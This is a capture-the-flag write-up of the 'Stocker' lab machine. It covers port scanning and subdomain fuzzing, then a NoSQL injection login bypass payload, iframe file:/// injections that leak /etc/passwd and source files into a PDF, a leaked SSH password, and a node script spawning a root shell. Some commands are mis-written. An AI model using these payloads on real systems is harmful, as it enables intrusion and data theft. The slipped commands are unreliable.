### Stocker Box Writeup
Stocker box is a HTB machine that is hosting a website. The website is “under construction”. Let's teach these devs a lesson for not running their site in on a test network before securing it!

First, let's create our instance and fire up our attack box.
I'm using ParrotOS with openvpn to connect to the lab box. You may also connect using HTB's web-based attack box, also running ParrotOS.
We can test our connection using
ping 10.129.5.218
to which we get the reply:
64 bytes from 10.129.5.218: icmp_seq=1 ttl=63 time=74.3 ms
which means we have configured our vpn correctly and we can connect to the lab machine.
So now we will see which ports are open using nmap.
nmap 10.129.5.218 -T5  -vvv
and we can see that 2 ports are open.
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
Because ssh is usually a pivot vector or useful after we gain a foothold, we will start pentesting port 80 (http).
curl 10.129.5.218
gives us a 301 so we must use the “-L” option.
curl 10.129.5.218 -L 
if you do not receive HTML, you have your hosts file set up incorrectly.

After reviewing the source code for the homepage, the following items stood out to me:

1. there is a javacript running:  <script src="js/aos.js"></script>
2. all the internal hyperlinks include “#” AKA fragment identifier

I checked if XMLRPC is enabled and I recieve a 404 page that listed the web server version as nginx 1.18.0

According to cve-details.com, there are no known vulnerabilities on this version of nginx.

Let's attempt to enumerate directories on the server using dirbuster. {FIG 3}

And also search subdomains using ffuf:
ffuf -u http://stocker.htb -H "Host: FUZZ.stocker.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 1000 -fc 301

If you don't have Daniel Miessler's SecLists, you may download them from git here:
		git clone https://github.com/danielmiessler/SecLists
		
We find that there is one subdomain named dev.stocker.htb. When connecting to the subdomain, we are redirected to dev.stocker.htb/login, a simple login page.

curl --url dev.stocker.htb -L

Now we're going to take advantage of Burp's interface to fuzz for weak authentication on the login form.

Next we will try to SQLi the login form using sqlmap.

The login form appears to not be vulnerable to SQLi. So lets try some NoSQLi!

The following JSON query is able to take down the login page.
{"username": {"$ne": null}, "password": {"$ne": null} }

We are now logged into the website and redirected to the /stock page. On this page is a simple web app.

Examine the source code of the webpage. Let's try to find a vulnerability in any scripts that run on the page to hopefully gain RCE and finally a shell.

The script included in the source code contains a function that performs a “POST” request to communicate with the web server. {FIG 6}

This POST request can be hijacked by inserting an iframe that reads /etc/passwd as one of the values:

“title”: “<iframe src=file:///etc/passwd height=800 width=800></iframe>”

The script will then print out the entirety of /etc/passwd into the order confirmation PDF! {FIG 7}

Let's try a few more iframe exploits.

“title”: "<iframe src=file:///></iframe>"
“title”: "<iframe src=file:///var/www/dev/index.js></iframe>"
“title”: "<iframe src=file:///var/www/dev/index.js width=500px height=500px></iframe>"

This file has some interesting information in it: 

{FIG 8}

With this password we can log into the angoose account via ssh.

ssh angoose@IHeardPassphrasesArePrettySecure

and cat out the user flag.

{fig 9, edited)

Let's see what sudo privileges this acount has:

sudo -L

Not surprisingly, this account has the ability to run any javascript as root.

We can craft a .js to find the root flag like so: 

javascript pwn

cat pwned.js 
const fs = require("child_process").spawn("/usr/bin/bash", {stdio: [0,1,2]})













